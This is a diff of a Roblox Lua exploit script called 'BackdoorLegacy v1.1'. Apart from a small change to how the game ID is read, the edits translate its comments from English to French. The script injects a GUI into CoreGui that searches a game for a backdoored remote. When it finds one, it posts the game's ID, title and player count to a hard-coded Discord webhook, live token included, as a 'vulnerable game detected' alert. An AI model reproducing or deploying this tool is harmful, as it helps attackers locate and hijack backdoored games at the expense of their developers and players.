@@ -1,33 +1,35 @@
--- == Partie pour Discord Webhook ==
+-- == Partie Webhook Discord ==
 local HttpService = game:GetService("HttpService")
-
 local webhookUrl = "https://discord.com/api/webhooks/1355719783735365762/9R_DzsqluTqr7wbbpl_3k1Ta4byL5kE7mqKQgH8IhE7uNiPDQgWCLtGC_bYAsUBVXEHl" -- Remplace ici
 
-local function sendToDiscord(gameId)
-    -- Get the game details
+local function sendToDiscord()
+    -- Utilisation de game.PlaceId pour obtenir l'ID du jeu
+    local gameId = game.PlaceId
+
+    -- Récupérer le titre du jeu
     local gameTitle = game:GetService("MarketplaceService"):GetProductInfo(gameId).Name
     local totalPlayers = 0
     
-    -- Calculate total number of players in all servers
+    -- Calculer le nombre total de joueurs sur tous les serveurs
     for _, server in pairs(game:GetService("Players"):GetPlayers()) do
         totalPlayers = totalPlayers + 1
     end
 
-    -- Prepare the embed data
+    -- Préparer les données à envoyer
     local data = {
         embeds = {
             {
                 title = "BackdoorLegacy | Jeu vulnérable détecté!",
                 description = "GameId: " .. gameId .. "\nTitle: " .. gameTitle .. "\nTotal Players: " .. totalPlayers,
-                color = 0xFF0000,  -- Red color for alert
+                color = 0xFF0000,  -- Couleur rouge pour l'alerte
                 fields = {
                     {
-                        name = "Game Information",
-                        value = "Game ID: " .. gameId .. "\nTitle: " .. gameTitle .. "\nTotal Players: " .. totalPlayers,
+                        name = "Informations du jeu",
+                        value = "Game ID: " .. gameId .. "\nTitre: " .. gameTitle .. "\nTotal des joueurs: " .. totalPlayers,
                     },
                 },
                 footer = {
-                    text = "BackdoorLegacy v1.1 - Action triggered",
+                    text = "BackdoorLegacy v1.1 - Action déclenchée",
                 },
             }
         }
@@ -106,7 +108,7 @@ local function sendToDiscord(gameId)
     -- Appel de la fonction pour envoyer la requête
     sendReq()
 end
--- == Fin de la partie Webhook ==
+-- == Fin Webhook Discord ==
 
 local function debug(msg)
     if 0 == 1 then 
@@ -114,7 +116,7 @@ local function debug(msg)
     end 
 end
 
--- Create GUI Objects
+-- Création des objets GUI
 
 local ScrnGui = Instance.new("ScreenGui")
 local MnPrt = Instance.new("Frame")
@@ -124,7 +126,7 @@ local Execy = Instance.new("TextButton")
 local Acqur = Instance.new("TextButton")
 local Labely = Instance.new("TextLabel")
 
--- Set Properties
+-- Définir les propriétés
 
 ScrnGui.Name = "BackdoorLegacy"
 ScrnGui.Parent = game:GetService('CoreGui')
@@ -201,7 +203,7 @@ Labely.FontSize = Enum.FontSize.Size14
 Labely.Text = 'BackdoorLegacy v1.1'
 Labely.TextColor3 = Color3.new(1,0,0)
 
--- Add functionalities!
+-- Fonctionnalités ajoutées !
 
 local AcquiredRemote = nil 
 local isAcquiring = false 
@@ -290,7 +292,7 @@ Acqur.MouseButton1Click:Connect(function()
             isFound = true 
             Cody.Text = '-- Remote acquired! :D' 
             warn('BackdoorLegacy // Remote acquired! :D')
-            sendToDiscord(game.GameId) -- ICI ON ENVOIE SUR DISCORD
+            sendToDiscord() -- Appel de la fonction d'envoi vers Discord
         else 
             isFound = false 
             Cody.Text = '-- Not found. :(' 
@@ -300,4 +302,4 @@ Acqur.MouseButton1Click:Connect(function()
     end 
 end)
 
--- End of script
+-- Fin du script
